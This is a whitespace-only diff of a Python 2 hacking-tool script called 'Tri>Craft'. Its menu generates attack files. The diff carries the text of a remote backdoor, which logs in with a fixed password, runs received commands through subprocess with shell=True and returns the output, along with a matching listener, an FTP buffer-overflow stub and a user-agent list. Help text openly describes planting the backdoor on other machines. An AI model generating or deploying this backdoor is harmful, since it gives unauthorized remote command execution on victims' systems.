@@ -23,15 +23,15 @@ C  = '\033[36m' # cyan
 GR = '\033[37m' # gray
 T  = '\033[93m' # tan  
 def table():
-	table = raw_input(''+G+'' + color.UNDERLINE + 'Tri>Craft>' + color.END)
-	if table == "backdoor":
-	    print (''+G+'[*] ' + color.UNDERLINE + ''+W+'Generating backdoor...' + color.END)
-	    print (''+G+'[*] ' + color.UNDERLINE + ''+W+'For all your remote access needs!' + color.END)	
-	    FILE = open("backdoor.py","w")
+    table = raw_input(''+G+'' + color.UNDERLINE + 'Tri>Craft>' + color.END)
+    if table == "backdoor":
+        print (''+G+'[*] ' + color.UNDERLINE + ''+W+'Generating backdoor...' + color.END)
+        print (''+G+'[*] ' + color.UNDERLINE + ''+W+'For all your remote access needs!' + color.END)	
+        FILE = open("backdoor.py","w")
 #============================================================================#
 #=================================BACKDOOR===================================#
 #============================================================================#
-	    FILE.write("""
+        FILE.write("""
 #!/usr/bin/python
 import subprocess #Process commands
 import socket #Process socket data
@@ -60,28 +60,28 @@ passwd = "root" #Password so other people cant connect
 
 #Check password
 def Login():
-	global s
-	s.send(""+T+"Login:"+W+"")
-	pwd = s.recv(1024)
+    global s
+    s.send(""+T+"Login:"+W+"")
+    pwd = s.recv(1024)
 
-	if pwd.strip() != passwd:		
-		Login()
-	else:
-		s.send(""+G+"Connected #>"+W+"")
-		Shell()
+    if pwd.strip() != passwd:		
+        Login()
+    else:
+        s.send(""+G+"Connected #>"+W+"")
+        Shell()
 
 #Execute shell commands
 def Shell():
-	while True:
-		data = s.recv(1024)
+    while True:
+        data = s.recv(1024)
 
-		if data.strip() == ":kill": 
-			break
+        if data.strip() == ":kill": 
+            break
 
-		proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-		output = proc.stdout.read() + proc.stderr.read()
-		s.send(output)
-		s.send(""+G+"#>"+W+"")
+        proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+        output = proc.stdout.read() + proc.stderr.read()
+        s.send(output)
+        s.send(""+G+"#>"+W+"")
 
 #Start Script
 try:
@@ -92,21 +92,21 @@ try:
 except:
     print ""
 """)
-	    print (''+G+'[*] ' + color.UNDERLINE + ''+W+'Done generating! Now fire away!' + color.END)
-	    FILE.close()
-	elif table == "help":
-	    print (''+C+'backdoor'+W+' - generate a backdoor that you can plant on other machines' + color.END)
-	    print (''+C+'listener'+W+' - listen to a specific port for the backdoor and other things' + color.END)
- 	    print (''+C+'exploit'+W+' - exploit a vulnerable target with shell code' + color.END)
-	    print (''+C+'useragents'+W+' - generate user-agents' + color.END)
-	elif table == "listener":
-	    print (''+G+'[*] ' + color.UNDERLINE + ''+W+'Generating listener...' + color.END)
-	    print (''+G+'[*] ' + color.UNDERLINE + ''+W+'Use this for your backdoor to get the connection!' + color.END)	
-	    FILE = open("listener.py","w")
+        print (''+G+'[*] ' + color.UNDERLINE + ''+W+'Done generating! Now fire away!' + color.END)
+        FILE.close()
+    elif table == "help":
+        print (''+C+'backdoor'+W+' - generate a backdoor that you can plant on other machines' + color.END)
+        print (''+C+'listener'+W+' - listen to a specific port for the backdoor and other things' + color.END)
+        print (''+C+'exploit'+W+' - exploit a vulnerable target with shell code' + color.END)
+        print (''+C+'useragents'+W+' - generate user-agents' + color.END)
+    elif table == "listener":
+        print (''+G+'[*] ' + color.UNDERLINE + ''+W+'Generating listener...' + color.END)
+        print (''+G+'[*] ' + color.UNDERLINE + ''+W+'Use this for your backdoor to get the connection!' + color.END)	
+        FILE = open("listener.py","w")
 #============================================================================#
 #=================================LISTENER===================================#
 #============================================================================#
-	    FILE.write("""
+        FILE.write("""
 #!/usr/bin/python
 from socket import *
 HOST = ''               # '' means bind to all interfaces
@@ -128,17 +128,17 @@ while 1:
 conn.close()
  
 """)
-	    FILE.close()
-	    print (''+G+'[*] ' + color.UNDERLINE + ''+W+'Done generating! Now fire away!' + color.END)
-	elif table == "exploit":
+        FILE.close()
+        print (''+G+'[*] ' + color.UNDERLINE + ''+W+'Done generating! Now fire away!' + color.END)
+    elif table == "exploit":
 #============================================================================#
 #=================================EXPLOIT====================================#
 #============================================================================#
 
-	    print (''+G+'[*] ' + color.UNDERLINE + ''+W+'Generating exploit thingy...' + color.END)
-	    print (''+G+'[*] ' + color.UNDERLINE + ''+W+'Use this to exploit vulnerable machines! Change the shell code to whatever you want!' + color.END)	
-	    FILE = open("exploit.py","w")
-	    FILE.write("""import sys
+        print (''+G+'[*] ' + color.UNDERLINE + ''+W+'Generating exploit thingy...' + color.END)
+        print (''+G+'[*] ' + color.UNDERLINE + ''+W+'Use this to exploit vulnerable machines! Change the shell code to whatever you want!' + color.END)	
+        FILE = open("exploit.py","w")
+        FILE.write("""import sys
 import socket
 import os
 
@@ -149,24 +149,24 @@ username = "A"*1024 #<-- shellcode here
 connect = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
 try:
-	connect.connect((hostname, 21))
+    connect.connect((hostname, 21))
 except:
-	print "Failed LOL"
-	response = connect.recv(2000)
-	print response
-	sys.exit(1)	
+    print "Failed LOL"
+    response = connect.recv(2000)
+    print response
+    sys.exit(1)	
 """)
-	    FILE.close()
-	    print (''+G+'[*] ' + color.UNDERLINE + ''+W+'Done generating! Now fire away!' + color.END)
-	elif table == "useragents":
+        FILE.close()
+        print (''+G+'[*] ' + color.UNDERLINE + ''+W+'Done generating! Now fire away!' + color.END)
+    elif table == "useragents":
 #============================================================================#
 #===============================USER-AGENTS==================================#
 #============================================================================#
 
-	    print (''+G+'[*] ' + color.UNDERLINE + ''+W+'Generating User Agents...' + color.END)
-	    print (''+G+'[*] ' + color.UNDERLINE + ''+W+'Use this for many different things!' + color.END)	
-	    FILE = open("User-Agents.txt","w")
-	    FILE.write("""Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)
+        print (''+G+'[*] ' + color.UNDERLINE + ''+W+'Generating User Agents...' + color.END)
+        print (''+G+'[*] ' + color.UNDERLINE + ''+W+'Use this for many different things!' + color.END)	
+        FILE = open("User-Agents.txt","w")
+        FILE.write("""Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)
 Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)
 Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)
 Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)
@@ -1066,5 +1066,5 @@ Opera/9.80 (Windows NT 5.2; U; en) Presto/2.2.15 Version/10.00
 Opera/9.80 (Windows NT 5.1; U; zh-cn) Presto/2.2.15 Version/10.00
 Opera/9.80 (Windows NT 5.1; U; ru) Presto/2.2.15 Version/10.00	
 """)
-	    FILE.close()
-	    print (''+G+'[*] ' + color.UNDERLINE + ''+W+'Done generating! Now fire away!' + color.END)
+        FILE.close()
+        print (''+G+'[*] ' + color.UNDERLINE + ''+W+'Done generating! Now fire away!' + color.END)
